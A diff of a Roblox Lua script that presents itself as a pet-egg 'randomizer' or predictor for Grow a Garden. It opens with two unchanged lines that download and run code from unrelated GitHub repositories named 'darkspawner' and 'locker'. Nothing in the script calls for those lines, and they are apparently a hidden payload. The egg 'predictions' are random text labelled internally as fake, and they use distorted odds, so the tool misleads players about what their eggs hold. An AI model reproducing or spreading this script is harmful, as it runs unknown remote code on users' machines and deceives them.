@@ -1,547 +1,237 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/GAGscriptbyyash/New-Obs/refs/heads/main/darkspawner"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSpawnerV99/guikiller/refs/heads/main/locker"))()
-print ("Hello, World!")
+local players = game:GetService("Players")
+local collectionService = game:GetService("CollectionService")
+local TweenService = game:GetService("TweenService")
+local localPlayer = players.LocalPlayer or players:GetPlayers()[1]
 
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-local Window = Rayfield:CreateWindow({
-   Name = "Egg Randmizer By OnlyDevs",
-   Icon = 0,
-   LoadingTitle = "Egg Randomizer Loading...",
-   LoadingSubtitle = "by OnlyDevsOfficial",
-   ShowText = "Rayfield",
-   Theme = "Default",
-   ToggleUIKeybind = "K",
-   DisableRayfieldPrompts = false,
-   DisableBuildWarnings = false,
-   ConfigurationSaving = {
-      Enabled = true,
-      FolderName = nil,
-      FileName = "KenriScripts_EggESP"
-   },
-   Discord = {
-      Enabled = false,
-      Invite = "noinvitelink",
-      RememberJoins = true
-   },
-   KeySystem = false,
-   KeySettings = {
-      Title = "Untitled",
-      Subtitle = "Key System",
-      Note = "No method of obtaining the key is provided",
-      FileName = "Key",
-      SaveKey = true,
-      GrabKeyFromSite = false,
-      Key = {"Hello"}
-   }
-})
+local BROWN_BG = Color3.fromRGB(118,61,25)
+local BROWN_LIGHT = Color3.fromRGB(164,97,43)
+local BROWN_BORDER = Color3.fromRGB(51,25,0)
+local ACCENT_GREEN = Color3.fromRGB(110,196,99)
+local BUTTON_GRAY = Color3.fromRGB(190,190,190)
+local BUTTON_BLUE = Color3.fromRGB(66,150,255)
+local BUTTON_BLUE_HOVER = Color3.fromRGB(85,180,255)
+local BUTTON_GREEN = Color3.fromRGB(85,200,85)
+local BUTTON_GREEN_HOVER = Color3.fromRGB(120,230,120)
+local BUTTON_RED = Color3.fromRGB(255,62,62)
+local BUTTON_RED_HOVER = Color3.fromRGB(255,100,100)
+local FONT = Enum.Font.FredokaOne
+local TILE_IMAGE = "rbxassetid://15910695828"
 
-local PetData = {
-    ["Common Egg"] = {
-        ["Golden Lab"] = 33.33,
-        ["Dog"] = 33.33,
-        ["Bunny"] = 33.33
-    },
-    ["Uncommon Egg"] = {
-        ["Black Bunny"] = 25,
-        ["Chicken"] = 25,
-        ["Cat"] = 25,
-        ["Deer"] = 25
-    },
-    ["Rare Egg"] = {
-        ["Orange Tabby"] = 33.33,
-        ["Spotted Deer"] = 25,
-        ["Pig"] = 16.67,
-        ["Rooster"] = 16.67,
-        ["Monkey"] = 8.33
-    },
-    ["Legendary Egg"] = {
-        ["Cow"] = 42.55,
-        ["Silver Monkey"] = 42.55,
-        ["Sea Otter"] = 10.64,
-        ["Turtle"] = 2.13,
-        ["Polar Bear"] = 2.13
-    },
-    ["Mythical Egg"] = {
-        ["Grey Mouse"] = 35.71,
-        ["Brown Mouse"] = 26.79,
-        ["Squirrel"] = 26.79,
-        ["Red Giant Ant"] = 8.93,
-        ["Red Fox"] = 1.79
-    },
-    ["Bug Egg"] = {
-        ["Snail"] = 40,
-        ["Giant Ant"] = 30,
-        ["Caterpillar"] = 25,
-        ["Praying Mantis"] = 4,
-        ["Dragonfly"] = 1
-    },
-    ["Night Egg"] = {
-        ["Hedgehog"] = 47,
-        ["Mole"] = 23.5,
-        ["Frog"] = 17.63,
-        ["Echo Frog"] = 8.23,
-        ["Night Owl"] = 3.53,
-        ["Raccoon"] = 0.12
-    },
-    ["Premium Night Egg"] = {
-        ["Hedgehog"] = 49,
-        ["Mole"] = 22,
-        ["Frog"] = 14,
-        ["Echo Frog"] = 10,
-        ["Night Owl"] = 4,
-        ["Raccoon"] = 1
-    },
-    ["Bee Egg"] = {
-        ["Bee"] = 65,
-        ["Honey Bee"] = 25,
-        ["Bear Bee"] = 5,
-        ["Petal Bee"] = 4,
-        ["Queen Bee (Pet)"] = 1
-    },
-    ["Anti Bee Egg"] = {
-        ["Wasp"] = 55,
-        ["Tarantula Hawk"] = 30,
-        ["Moth"] = 13.75,
-        ["Butterfly"] = 1,
-        ["Disco Bee"] = 0.25
-    },
-    ["Common Summer Egg"] = {
-        ["Starfish"] = 50,
-        ["Seagull"] = 25,
-        ["Crab"] = 25
-    },
-    ["Rare Summer Egg"] = {
-        ["Flamingo"] = 30,
-        ["Toucan"] = 25,
-        ["Sea Turtle"] = 20,
-        ["Orangutan"] = 15,
-        ["Seal"] = 10
-    },
-    ["Paradise Egg"] = {
-        ["Ostrich"] = 40,
-        ["Peacock"] = 30,
-        ["Capybara"] = 21,
-        ["Scarlet Macaw"] = 8,
-        ["Mimic Octopus"] = 1
-    },
-    ["Oasis Egg"] = {
-        ["Meerkat"] = 45,
-        ["Sand Snake"] = 34.5,
-        ["Axolotl"] = 15,
-        ["Hyacinth Macaw"] = 5,
-        ["Fennec Fox"] = 0.5
-    },
-    ["Premium Oasis Egg"] = {
-        ["Meerkat"] = 45,
-        ["Sand Snake"] = 34.5,
-        ["Axolotl"] = 15,
-        ["Hyacinth Macaw"] = 5,
-        ["Fennec Fox"] = 0.5
-    },
-    ["Dinosaur Egg"] = {
-        ["Raptor"] = 35,
-        ["Triceratops"] = 32.5,
-        ["Stegosaurus"] = 28,
-        ["Pterodactyl"] = 3,
-        ["Brontosaurus"] = 1,
-        ["T-Rex"] = 0.5
-    },
-    ["Primal Egg"] = {
-        ["Parasaurolophus"] = 35,
-        ["Iguanodon"] = 32.5,
-        ["Pachycephalosaurus"] = 28,
-        ["Dilophosaurus"] = 3,
-        ["Ankylosaurus"] = 1,
-        ["Spinosaurus"] = 0.5
-    },
-    ["Premium Primal Egg"] = {
-        ["Parasaurolophus"] = 35,
-        ["Iguanodon"] = 32.5,
-        ["Pachycephalosaurus"] = 28,
-        ["Dilophosaurus"] = 3,
-        ["Ankylosaurus"] = 1,
-        ["Spinosaurus"] = 0.5
-    },
-    ["Zen Egg"] = {
-        ["Shiba Inu"] = 40,
-        ["Nihonzaru"] = 31,
-        ["Tanuki"] = 20.82,
-        ["Tanchozuru"] = 4.6,
-        ["Kappa"] = 3.5,
-        ["Kitsune"] = 0.08
-    },
-    ["Gourmet Egg"] = {
-        ["Bagel Bunny"] = 50,
-        ["Pancake Mole"] = 38,
-        ["Sushi Bear"] = 7,
-        ["Spaghetti Sloth"] = 4,
-        ["French Fry Ferret"] = 1
-    }
+local eggChances = {
+	["Common Egg"] = { Dog=33, Bunny=33, ["Golden Lab"]=33 },
+	["Uncommon Egg"] = { ["Black Bunny"]=25, Chicken=25, Cat=25, Deer=25 },
+	["Rare Egg"] = { ["Orange Tabby"]=33.33, ["Spotted Deer"]=25, Pig=16.67, Rooster=16.67, Monkey=8.33 },
+	["Legendary Egg"] = { Cow=42.55, ["Silver Monkey"]=42.55, ["Sea Otter"]=10.64, Turtle=2.13, ["Polar Bear"]=2.13 },
+	["Mythic Egg"] = { ["Grey Mouse"]=37.5, ["Brown Mouse"]=26.79, Squirrel=26.79, ["Red Giant Ant"]=8.93, ["Red Fox"]=0 },
+	["Bug Egg"] = { Snail=40, ["Giant Ant"]=35, Caterpillar=25, ["Praying Mantis"]=0, ["Dragon Fly"]=50 },
+	["Night Egg"] = { Hedgehog=47, Mole=23.5, Frog=21.16, ["Echo Frog"]=8.35, ["Night Owl"]=0, Raccoon=50 },
+	["Bee Egg"] = { Bee=65, ["Honey Bee"]=20, ["Bear Bee"]=10, ["Petal Bee"]=5, ["Queen Bee"]=0 },
+	["Anti Bee Egg"] = { Wasp=55, ["Tarantula Hawk"]=31, Moth=14, Butterfly=0, ["Disco Bee"]=0 },
+	["Common Summer Egg"] = { Starfish=50, Seafull=25, Crab=25 },
+	["Rare Summer Egg"] = { Flamingo=30, Toucan=25, ["Sea Turtle"]=20, Orangutan=15, Seal=10 },
+	["Paradise Egg"] = { Ostrich=43, Peacock=33, Capybara=24, ["Scarlet Macaw"]=3, ["Mimic Octopus"]=40 },
+	["Premium Night Egg"] = { Hedgehog=50, Mole=26, Frog=14, ["Echo Frog"]=10 },
+	["Primal Egg"] = {
+		Parasaurolophus=35,
+		Iguanodon=32.5,
+		Pachycephalosaurus=28,
+		Dilophosaurus=3,
+		Ankylosaurus=1,
+		Spinosaurus=0.5
+	},
+	["Dinosaur Egg"] = {
+		["T-Rex"]=50,
+		Brontosaurus=30,
+		Triceratops=10,
+		Velociraptor=10
+	},
+	["Zen Egg"] = {
+		["Shiba Inu"] = 40,
+		["Nihonzaru"] = 31,
+		["Tanuki"] = 20.82,
+		["Tanchozuru"] = 4.6,
+		["Kappa"] = 3.5,
+		["Kitsune"] = 50
+	},
+	["Gourmet Egg"] = {
+		["Bagel Bunny"] = 50,
+		["Pancake Mole"] = 38,
+		["Sushi Bear"] = 7,
+		["Spaghetti Sloth"] = 4,
+		["French Fry Ferret"] = 1
+	}
 }
 
-local EggVisuals = {}
-local VisualsEnabled = false
-local AutoRerollEnabled = false
-local RerollSpeed = 0.5
-local SelectedPet = ""
-local AutoRerollConnection
-local PausedEggs = {}
-local SavedPredictions = {}
+local realESP = {
+	["Common Egg"]=true, ["Uncommon Egg"]=true, ["Rare Egg"]=true,
+	["Common Summer Egg"]=true, ["Rare Summer Egg"]=true
+}
 
-local function getAllUniquePets()
-    local uniquePets = {}
-    local petSet = {}
-    for egg, visual in pairs(EggVisuals) do
-        if visual.eggName and PetData[visual.eggName] then
-            for petName, _ in pairs(PetData[visual.eggName]) do
-                if not petSet[petName] then
-                    petSet[petName] = true
-                    table.insert(uniquePets, petName)
-                end
-            end
-        end
-    end
-    table.sort(uniquePets)
-    return uniquePets
+local displayedEggs, autoStopOn = {}, false
+
+local function weightedRandom(opts)
+	local v,t = {},0
+	for pet,ch in pairs(opts) do if ch>0 then table.insert(v,{pet=pet,ch=ch}); t+=ch end end
+	if #v==0 then return nil end
+	local r = math.random()*t
+	local cum = 0
+	for _,x in ipairs(v) do cum+=x.ch; if r<=cum then return x.pet end end
+	return v[1].pet
 end
 
-local function getRandomPet(eggName)
-    local pets = PetData[eggName]
-    if not pets then return "Unknown Pet" end
-    local totalWeight = 0
-    local weightedPets = {}
-    for petName, chance in pairs(pets) do
-        totalWeight = totalWeight + chance
-        table.insert(weightedPets, {name = petName, weight = chance})
-    end
-    local randomValue = math.random() * totalWeight
-    local currentWeight = 0
-    for _, petData in pairs(weightedPets) do
-        currentWeight = currentWeight + petData.weight
-        if randomValue <= currentWeight then
-            return petData.name
-        end
-    end
-    return weightedPets[1].name
-end
-local function findPlayerFarm()
-    local player = game.Players.LocalPlayer
-    if not workspace:FindFirstChild("Farm") then return nil end
-    local playerName = player.Name
-    for _, farm in pairs(workspace.Farm:GetChildren()) do
-        if farm.Name == "Farm" and farm:FindFirstChild("Important") then
-            local important = farm.Important
-            local data = important:FindFirstChild("Data")
-            if data and data:FindFirstChild("Owner") then
-                local ownerValue = data.Owner.Value
-                if tostring(ownerValue) == playerName then
-                    return farm
-                end
-            end
-        end
-    end
-    Rayfield:Notify({
-        Title = "Farm Not Found",
-        Content = "Could not locate your farm",
-        Duration = 3,
-        Image = 4483346149,
-    })
-    return nil
+local function getNonRepeatingRandomPet(name,last)
+	local pool = eggChances[name]
+	if not pool then return nil end
+	for i=1,5 do
+		local pet = weightedRandom(pool)
+		if pet~=last or math.random()<0.3 then return pet end
+	end
+	return weightedRandom(pool)
 end
 
-local function createEggVisual(egg)
-    local eggName = egg:GetAttribute("EggName") or "Unknown Egg"
-    local highlight = Instance.new("Highlight")
-    highlight.FillColor = Color3.fromRGB(255, 0, 0)
-    highlight.FillTransparency = 0.5
-    highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
-    highlight.OutlineTransparency = 0
-    highlight.Parent = egg
-
-    local billboard = Instance.new("BillboardGui")
-    billboard.Size = UDim2.new(0, 150, 0, 50)
-    billboard.Adornee = egg
-    billboard.AlwaysOnTop = true
-    billboard.StudsOffset = Vector3.new(0, 3, 0)
-    billboard.Parent = workspace
-
-    local eggId = tostring(egg)
-    local petName
-    if SavedPredictions[eggId] then
-        petName = SavedPredictions[eggId]
-    else
-        petName = getRandomPet(eggName)
-        SavedPredictions[eggId] = petName
-    end
-
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(1, 0, 1, 0)
-    textLabel.BackgroundTransparency = 1
-    textLabel.Text = petName
-    textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-    textLabel.TextStrokeTransparency = 0
-    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    textLabel.Font = Enum.Font.GothamBold
-    textLabel.TextSize = 14
-    textLabel.TextScaled = false
-    textLabel.TextWrapped = true
-    textLabel.Visible = false
-    textLabel.Parent = billboard
-
-    return {
-        highlight = highlight,
-        billboard = billboard,
-        textLabel = textLabel,
-        eggName = eggName,
-        eggId = eggId
-    }
+local function createEspGui(obj,txt)
+	local bg = Instance.new("BillboardGui")
+	bg.Name="FakePetESP"
+	bg.Adornee = obj:FindFirstChildWhichIsA("BasePart") or obj.PrimaryPart or obj
+	bg.Size = UDim2.new(0,200,0,50)
+	bg.StudsOffset = Vector3.new(0,2.5,0)
+	bg.AlwaysOnTop = true
+	local lbl = Instance.new("TextLabel",bg)
+	lbl.Size = UDim2.new(1,0,1,0)
+	lbl.BackgroundTransparency = 1
+	lbl.TextColor3 = Color3.new(1,1,1)
+	lbl.TextStrokeTransparency = 0
+	lbl.TextScaled = true
+	lbl.Font = Enum.Font.SourceSansBold
+	lbl.Text = txt
+	bg.Parent = obj
+	return bg
 end
 
-local function updateEggVisuals()
-    if not VisualsEnabled then return end
-    local playerFarm = findPlayerFarm()
-    if not playerFarm then
-        Rayfield:Notify({
-            Title = "Debug Error",
-            Content = "No farm found, cannot create visuals",
-            Duration = 5,
-            Image = 4483346149,
-        })
-        return
-    end
-    local important = playerFarm:FindFirstChild("Important")
-    if not important then
-        Rayfield:Notify({
-            Title = "Debug Error",
-            Content = "Important folder not found in your farm",
-            Duration = 5,
-            Image = 4483346149,
-        })
-        return
-    end
-    local objectsPhysical = important:FindFirstChild("Objects_Physical")
-    if not objectsPhysical then
-        Rayfield:Notify({
-            Title = "Debug Error",
-            Content = "Objects_Physical not found in Important folder",
-            Duration = 5,
-            Image = 4483346149,
-        })
-        return
-    end
-
-    for _, visual in pairs(EggVisuals) do
-        if visual.highlight then visual.highlight:Destroy() end
-        if visual.billboard then visual.billboard:Destroy() end
-    end
-    EggVisuals = {}
-
-    local totalEggs = 0
-    local readyEggs = 0
-    local playerEggs = 0
-    local player = game.Players.LocalPlayer
-
-    for _, obj in pairs(objectsPhysical:GetChildren()) do
-        if obj.Name == "PetEgg" then
-            totalEggs = totalEggs + 1
-            local isReady = obj:GetAttribute("READY")
-            if isReady then
-                readyEggs = readyEggs + 1
-            end
-            local owner = obj:GetAttribute("OWNER")
-            if owner == player.Name then
-                playerEggs = playerEggs + 1
-                EggVisuals[obj] = createEggVisual(obj)
-            end
-        end
-    end
-
-    Rayfield:Notify({
-        Title = "Eggs Found",
-        Content = "Total: " .. totalEggs .. " | Ready: " .. readyEggs .. " | Yours: " .. playerEggs,
-        Duration = 4,
-        Image = 4483346149,
-    })
-
-    Rayfield:Notify({
-        Title = "Visuals Created",
-        Content = "Created " .. playerEggs .. " egg visuals for your eggs",
-        Duration = 3,
-        Image = 4483346149,
-    })
-
-    wait(0.1)
-    showAvailablePets()
+local function addESP(egg)
+	if egg:GetAttribute("OWNER")~=localPlayer.Name then return end
+	local n,id = egg:GetAttribute("EggName"), egg:GetAttribute("OBJECT_UUID")
+	if not n or not id or displayedEggs[id] then return end
+	local txt = realESP[n] and n or n.." | "..(getNonRepeatingRandomPet(n,nil) or "?")
+	local gui = createEspGui(egg,txt)
+	displayedEggs[id] = {egg=egg,gui=gui,label=gui:FindFirstChildWhichIsA("TextLabel"),eggName=n,lastPet=nil}
 end
 
-local function rerollPredictions()
-    for egg, visual in pairs(EggVisuals) do
-        if not PausedEggs[egg] and visual.textLabel and visual.eggName and visual.eggId then
-            local newPet = getRandomPet(visual.eggName)
-            visual.textLabel.Text = newPet
-            visual.textLabel.Visible = true
-            SavedPredictions[visual.eggId] = newPet
-            if SelectedPet ~= "" and newPet == SelectedPet then
-                PausedEggs[egg] = true
-                Rayfield:Notify({
-                    Title = "Pet Found!",
-                    Content = "Found " .. SelectedPet .. " on an egg!",
-                    Duration = 3,
-                    Image = 4483346149,
-                })
-            end
-        end
-    end
+local function removeESP(egg)
+	local id = egg:GetAttribute("OBJECT_UUID")
+	if id and displayedEggs[id] then displayedEggs[id].gui:Destroy(); displayedEggs[id]=nil end
 end
 
-local function toggleVisuals(state)
-    VisualsEnabled = state
-    if state then
-        updateEggVisuals()
-    else
-        for _, visual in pairs(EggVisuals) do
-            if visual.highlight then visual.highlight:Destroy() end
-            if visual.billboard then visual.billboard:Destroy() end
-        end
-        EggVisuals = {}
-        PausedEggs = {}
-    end
+for _,e in collectionService:GetTagged("PetEggServer") do addESP(e) end
+collectionService:GetInstanceAddedSignal("PetEggServer"):Connect(addESP)
+collectionService:GetInstanceRemovedSignal("PetEggServer"):Connect(removeESP)
+
+local gui = Instance.new("ScreenGui", localPlayer:WaitForChild("PlayerGui"))
+gui.Name = "RandomizerStyledGUI"
+gui.ResetOnSpawn = false
+
+local main = Instance.new("Frame",gui)
+main.Size = UDim2.new(0,220,0,120)
+main.Position = UDim2.new(0.5,-130,0.5,-70)
+main.BackgroundColor3 = BROWN_BG
+main.Active = true
+main.Draggable = true
+Instance.new("UICorner",main).CornerRadius = UDim.new(0,10)
+Instance.new("UIStroke",main).Thickness = 2
+Instance.new("UIStroke",main).Color = BROWN_BORDER
+local bg = Instance.new("ImageLabel",main)
+bg.Size = UDim2.new(1,0,1,0)
+bg.Image = TILE_IMAGE
+bg.BackgroundTransparency = 1
+bg.ScaleType = Enum.ScaleType.Tile
+bg.TileSize = UDim2.new(0,96,0,96)
+
+local top = Instance.new("Frame",main)
+top.Size = UDim2.new(1,0,0,26)
+top.BackgroundColor3 = ACCENT_GREEN
+top.BorderSizePixel = 0
+Instance.new("UICorner",top).CornerRadius = UDim.new(0,10)
+local topImg = Instance.new("ImageLabel",top)
+topImg.Size = UDim2.new(1,0,1,0)
+topImg.Image = TILE_IMAGE
+topImg.BackgroundTransparency = 1
+topImg.ScaleType = Enum.ScaleType.Tile
+topImg.TileSize = UDim2.new(0,96,0,96)
+local title = Instance.new("TextLabel",top)
+title.Size = UDim2.new(1,-62,1,0)
+title.Position = UDim2.new(0,8,0,0)
+title.BackgroundTransparency = 1
+title.Text = "Egg Randomizer By OnlyDevs"
+title.Font = FONT
+title.TextColor3 = Color3.new(1,1,1)
+title.TextStrokeTransparency = 0
+title.TextScaled = true
+title.TextXAlignment = Enum.TextXAlignment.Left
+local btnX = Instance.new("TextButton",top)
+btnX.Size = UDim2.new(0,18,0,18)
+btnX.Position = UDim2.new(1,-25,0.5,-9)
+btnX.BackgroundColor3 = BUTTON_RED
+btnX.Text = "X"
+btnX.Font = FONT
+btnX.TextColor3 = Color3.new(1,1,1)
+btnX.TextScaled = true
+btnX.TextStrokeTransparency = 0.3
+btnX.MouseEnter:Connect(function() btnX.BackgroundColor3 = BUTTON_RED_HOVER end)
+btnX.MouseLeave:Connect(function() btnX.BackgroundColor3 = BUTTON_RED end)
+btnX.MouseButton1Click:Connect(function() gui:Destroy() end)
+
+local content = Instance.new("Frame",main)
+content.Name = "ContentFrame"
+content.Size = UDim2.new(1,-8,1,-50)
+content.Position = UDim2.new(0,4,0,32)
+content.BackgroundTransparency = 1
+
+local function updateStop(btn)
+	btn.BackgroundColor3 = autoStopOn and BUTTON_GREEN or BUTTON_RED
+	btn.Text = "[A] Auto Roll: " .. (autoStopOn and "ON" or "OFF")
 end
 
-local function handleAutoReroll()
-    if AutoRerollConnection then
-        AutoRerollConnection:Disconnect()
-    end
-    if AutoRerollEnabled and VisualsEnabled then
-        AutoRerollConnection = game:GetService("RunService").Heartbeat:Connect(function()
-            wait(RerollSpeed)
-            rerollPredictions()
-        end)
-    end
+local function makeBtn(txt,y,c,h,ond,offd)
+	local b = Instance.new("TextButton",content)
+	b.Size = UDim2.new(0.9,0,0,26)
+	b.Position = UDim2.new(0.05,0,0,y)
+	b.BackgroundColor3 = c
+	b.Text = txt
+	b.Font = FONT
+	b.TextColor3 = Color3.new(1,1,1)
+	b.TextScaled = true
+	b.TextStrokeTransparency = 0.25
+	Instance.new("UICorner",b).CornerRadius = UDim.new(0,7)
+	Instance.new("UIStroke",b).Color = BROWN_BORDER
+	b.MouseEnter:Connect(function() if ond then ond(b) else b.BackgroundColor3 = h end end)
+	b.MouseLeave:Connect(function() if offd then offd(b) else b.BackgroundColor3 = c end end)
+	return b
 end
 
-local function showAvailablePets()
-    if not VisualsEnabled or not next(EggVisuals) then return end
-    local eggGroups = {}
-    for egg, visual in pairs(EggVisuals) do
-        local eggName = visual.eggName
-        if not eggGroups[eggName] then eggGroups[eggName] = {} end
-        if PetData[eggName] then
-            for petName, _ in pairs(PetData[eggName]) do
-                eggGroups[eggName][petName] = true
-            end
-        end
-    end
-    for eggName, pets in pairs(eggGroups) do
-        local petNames = {}
-        for petName, _ in pairs(pets) do
-            table.insert(petNames, petName)
-        end
-        table.sort(petNames)
-        local petsList = table.concat(petNames, ", ")
-        Rayfield:Notify({
-            Title = eggName .. " (" .. #petNames .. " pets)",
-            Content = petsList,
-            Duration = 6,
-            Image = 4483346149,
-        })
-        wait(0.2)
-    end
-end
+local stop = makeBtn("[A] Auto Stop: OFF",0,BUTTON_RED,BUTTON_RED_HOVER,
+	function(b) b.BackgroundColor3 = autoStopOn and BUTTON_GREEN_HOVER or BUTTON_RED_HOVER end,
+	function(b) updateStop(b) end)
+stop.MouseButton1Click:Connect(function() autoStopOn = not autoStopOn; updateStop(stop) end)
 
-local EggTab = Window:CreateTab("Pet Egg ESP", 4483346149)
+local reroll = makeBtn("[B] Randomize Pet",32,BUTTON_BLUE,BUTTON_BLUE_HOVER)
+reroll.MouseButton1Click:Connect(function()
+	for _,data in pairs(displayedEggs) do
+		local pet = getNonRepeatingRandomPet(data.eggName, data.lastPet)
+		if pet and data.label then
+			data.label.Text = data.eggName.." | "..pet
+			data.lastPet = pet
+		end
+	end
+end)
 
-local PetEggToggle = EggTab:CreateToggle({
-   Name = "Pet Egg Visuals",
-   CurrentValue = false,
-   Flag = "PetEggVisualsToggle",
-   Callback = function(Value)
-       toggleVisuals(Value)
-   end,
-})
-
-local RerollButton = EggTab:CreateButton({
-   Name = "Reroll Predictions",
-   Callback = function()
-       if VisualsEnabled then
-           PausedEggs = {}
-           rerollPredictions()
-           Rayfield:Notify({
-               Title = "Rerolled",
-               Content = "Pet predictions have been rerolled!",
-               Duration = 2,
-               Image = 4483346149,
-           })
-       else
-           Rayfield:Notify({
-               Title = "Enable Visuals First",
-               Content = "Please enable Pet Egg Visuals first!",
-               Duration = 3,
-               Image = 4483346149,
-           })
-       end
-   end,
-})
-
-local AutoRerollToggle = EggTab:CreateToggle({
-   Name = "Auto Reroll",
-   CurrentValue = false,
-   Flag = "AutoRerollToggle",
-   Callback = function(Value)
-       AutoRerollEnabled = Value
-       handleAutoReroll()
-   end,
-})
-
-local RerollSpeedSlider = EggTab:CreateSlider({
-   Name = "Auto Reroll Speed",
-   Range = {0, 10},
-   Increment = 1,
-   Suffix = " (0.5s)",
-   CurrentValue = 1,
-   Flag = "RerollSpeedSlider",
-   Callback = function(Value)
-       RerollSpeed = Value * 0.5
-       if Value == 0 then RerollSpeed = 0.25 end
-       if AutoRerollEnabled then handleAutoReroll() end
-   end,
-})
-
-local SelectedPetInput = EggTab:CreateInput({
-   Name = "Selected Pet (Case Sensitive)",
-   PlaceholderText = "Enter pet name here...",
-   RemoveTextAfterFocusLost = false,
-   Flag = "SelectedPetInput",
-   Callback = function(Text)
-       SelectedPet = Text
-       PausedEggs = {}
-   end,
-})
-
-local ShowPetsButton = EggTab:CreateButton({
-   Name = "Show Available Pets",
-   Callback = function()
-       if VisualsEnabled and next(EggVisuals) then
-           showAvailablePets()
-       else
-           Rayfield:Notify({
-               Title = "Enable Visuals First",
-               Content = "Please enable Pet Egg Visuals first!",
-               Duration = 3,
-               Image = 4483346149,
-           })
-       end
-   end,
-})
-
-local InfoSection = EggTab:CreateSection("How to Use")
-
-EggTab:CreateParagraph({
-    Title = "Instructions",
-    Content = "1. Enable Pet Egg Visuals to see red highlights on your eggs\n2. Use Reroll to change predictions\n3. Enter a pet name to auto-pause when found\n4. Auto Reroll will continuously change predictions\n5. Show Available Pets displays all possible pets from your eggs"
-})
-
-EggTab:CreateParagraph({
-    Title = "Credits",
-    Content = "Egg ESP by KenriScripts\nPet Egg Predictor Script for Grow A Garden"
-})
+local footer = Instance.new("TextLabel",main)
+footer.Size = UDim2.new(1,-10,0,16)
+footer.Position = UDim2.new(0,5,1,-18)
+footer.BackgroundTransparency = 1
+footer.Text = "Made by OnlyDevs"
+footer.Font = FONT
+footer.TextColor3 = Color3.new(1,1,1)
+footer.TextStrokeTransparency = 0.5
+footer.TextScaled = true
